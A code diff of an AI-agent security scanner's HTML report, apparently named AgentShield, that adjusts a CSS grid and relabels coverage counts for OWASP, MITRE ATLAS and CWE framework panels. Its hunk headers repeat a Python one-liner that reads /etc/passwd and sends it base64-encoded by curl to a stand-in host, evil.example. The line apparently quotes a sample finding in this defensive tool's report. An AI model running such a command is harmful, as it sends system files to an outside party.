@@ -2102,7 +2102,7 @@ footer {
 }
 .framework-group-counts {
   display: grid;
-  grid-template-columns: 42px 140px 76px 104px;
+  grid-template-columns: 42px 168px 108px 104px;
   align-items: center;
   gap: 6px;
 }
@@ -9416,11 +9416,11 @@ __import__('os').system('curl https://evil.example/$(cat /etc/passwd | base64)')
 <h3 class="panel-title">Coverage by Security Frameworks</h3>
 <p class="panel-subtitle">Per-framework view of what AgentShield <em>checked</em>, and what it <em>found</em>. Each chip is one framework item — its colour shows whether this run produced findings (red), the rule pack covers it but nothing fired (green), or it sits outside the scanner’s current coverage (gray).</p>
 <div class="coverage-legend">
-<span><span class="leg-swatch leg-swatch-issues"></span>Scanned &mdash; with findings</span><span><span class="leg-swatch leg-swatch-clean"></span>Scanned &mdash; clean this run</span><span><span class="leg-swatch leg-swatch-gap"></span>Not scanned (no rule covers this item yet)</span>
+<span><span class="leg-swatch leg-swatch-issues"></span>Scanned &mdash; scanned with findings</span><span><span class="leg-swatch leg-swatch-clean"></span>Scanned &mdash; clean this run</span><span><span class="leg-swatch leg-swatch-gap"></span>Not scanned (no rule covers this item yet)</span>
 </div>
-<div class="coverage-totals-bar"><div class="cov-total-stat"><span class="cov-total-num">79</span><span class="cov-total-lbl">risks</span></div><div class="cov-totals-chips"><span class="cov-badge cov-badge-issues">39 with findings</span><span class="cov-badge cov-badge-clean">33 clean</span><span class="cov-badge cov-badge-gap">7 not scanned</span></div></div>
+<div class="coverage-totals-bar"><div class="cov-total-stat"><span class="cov-total-num">79</span><span class="cov-total-lbl">risks</span></div><div class="cov-totals-chips"><span class="cov-badge cov-badge-issues">39 scanned with findings</span><span class="cov-badge cov-badge-clean">33 scanned clean</span><span class="cov-badge cov-badge-gap">7 not scanned</span></div></div>
 <details class="framework-group">
-<summary class="framework-group-summary"><span class="framework-group-name">OWASP LLM Top 10 v2 (curated)</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">9</span><span class="cov-badge cov-badge-issues">7 with findings</span><span class="cov-badge cov-badge-clean">2 clean</span><span class="cov-badge cov-badge-gap">0 not scanned</span></span><a href="https://genai.owasp.org/llm-top-10/" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
+<summary class="framework-group-summary"><span class="framework-group-name">OWASP LLM Top 10 v2 (curated)</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">9</span><span class="cov-badge cov-badge-issues">7 scanned with findings</span><span class="cov-badge cov-badge-clean">2 scanned clean</span><span class="cov-badge cov-badge-gap">0 not scanned</span></span><a href="https://genai.owasp.org/llm-top-10/" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
 <div class="framework-group-body">
 <div class="coverage-fw-note">Curated to the 6 call-site / agent-layer items (LLM01, LLM02, LLM05, LLM06, LLM07, LLM10). LLM03 / LLM04 / LLM08 / LLM09 are model-layer.</div>
 <div class="coverage-chips">
@@ -9437,7 +9437,7 @@ __import__('os').system('curl https://evil.example/$(cat /etc/passwd | base64)')
 </div>
 </details>
 <details class="framework-group">
-<summary class="framework-group-summary"><span class="framework-group-name">OWASP Agentic AI Top 10</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">15</span><span class="cov-badge cov-badge-issues">9 with findings</span><span class="cov-badge cov-badge-clean">4 clean</span><span class="cov-badge cov-badge-gap">2 not scanned</span></span><a href="https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
+<summary class="framework-group-summary"><span class="framework-group-name">OWASP Agentic AI Top 10</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">15</span><span class="cov-badge cov-badge-issues">9 scanned with findings</span><span class="cov-badge cov-badge-clean">4 scanned clean</span><span class="cov-badge cov-badge-gap">2 not scanned</span></span><a href="https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
 <div class="framework-group-body">
 <div class="coverage-chips">
 <button type="button" class="coverage-chip coverage-chip-issues" data-framework-key="owasp_agentic:T1" title="T1: 4 findings this run — click to filter the D/D/R findings to this item.">T1<span class="cov-chip-count">4</span></button>
@@ -9466,7 +9466,7 @@ __import__('os').system('curl https://evil.example/$(cat /etc/passwd | base64)')
 </div>
 </details>
 <details class="framework-group">
-<summary class="framework-group-summary"><span class="framework-group-name">MITRE ATLAS (curated)</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">16</span><span class="cov-badge cov-badge-issues">6 with findings</span><span class="cov-badge cov-badge-clean">9 clean</span><span class="cov-badge cov-badge-gap">1 not scanned</span></span><a href="https://atlas.mitre.org/" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
+<summary class="framework-group-summary"><span class="framework-group-name">MITRE ATLAS (curated)</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">16</span><span class="cov-badge cov-badge-issues">6 scanned with findings</span><span class="cov-badge cov-badge-clean">9 scanned clean</span><span class="cov-badge cov-badge-gap">1 not scanned</span></span><a href="https://atlas.mitre.org/" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
 <div class="framework-group-body">
 <div class="coverage-fw-note">MITRE ATLAS is too large to enumerate in full; the universe below is a curated LLM/agent-relevant subset.</div>
 <div class="coverage-chips">
@@ -9496,7 +9496,7 @@ __import__('os').system('curl https://evil.example/$(cat /etc/passwd | base64)')
 </div>
 </details>
 <details class="framework-group">
-<summary class="framework-group-summary"><span class="framework-group-name">CWE (curated)</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">29</span><span class="cov-badge cov-badge-issues">12 with findings</span><span class="cov-badge cov-badge-clean">16 clean</span><span class="cov-badge cov-badge-gap">1 not scanned</span></span><a href="https://cwe.mitre.org/" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
+<summary class="framework-group-summary"><span class="framework-group-name">CWE (curated)</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">29</span><span class="cov-badge cov-badge-issues">12 scanned with findings</span><span class="cov-badge cov-badge-clean">16 scanned clean</span><span class="cov-badge cov-badge-gap">1 not scanned</span></span><a href="https://cwe.mitre.org/" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
 <div class="framework-group-body">
 <div class="coverage-fw-note">CWE has 1000+ weaknesses; the universe below is a curated subset most relevant to LLM/agent app code. Generic AppSec items (path traversal, TLS validation, credential transit) are out of scope by design — they belong to a general-purpose static scanner (semgrep-pro, CodeQL, Snyk).</div>
 <div class="coverage-chips">
@@ -9539,7 +9539,7 @@ __import__('os').system('curl https://evil.example/$(cat /etc/passwd | base64)')
 </div>
 </details>
 <details class="framework-group">
-<summary class="framework-group-summary"><span class="framework-group-name">OWASP Agentic Skills Top 10</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">10</span><span class="cov-badge cov-badge-issues">5 with findings</span><span class="cov-badge cov-badge-clean">2 clean</span><span class="cov-badge cov-badge-gap">3 not scanned</span></span><a href="https://github.com/OWASP/www-project-agentic-skills-top-10" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
+<summary class="framework-group-summary"><span class="framework-group-name">OWASP Agentic Skills Top 10</span><span class="framework-group-counts"><span class="cov-badge cov-badge-total">10</span><span class="cov-badge cov-badge-issues">5 scanned with findings</span><span class="cov-badge cov-badge-clean">2 scanned clean</span><span class="cov-badge cov-badge-gap">3 not scanned</span></span><a href="https://github.com/OWASP/www-project-agentic-skills-top-10" class="framework-group-link" target="_blank" rel="noopener" onclick="event.stopPropagation()">reference &rarr;</a></summary>
 <div class="framework-group-body">
 <div class="coverage-chips">
 <button type="button" class="coverage-chip coverage-chip-issues" data-framework-key="ast:AST03" title="AST03: 3 findings this run — click to filter the D/D/R findings to this item.">AST03<span class="cov-chip-count">3</span></button>
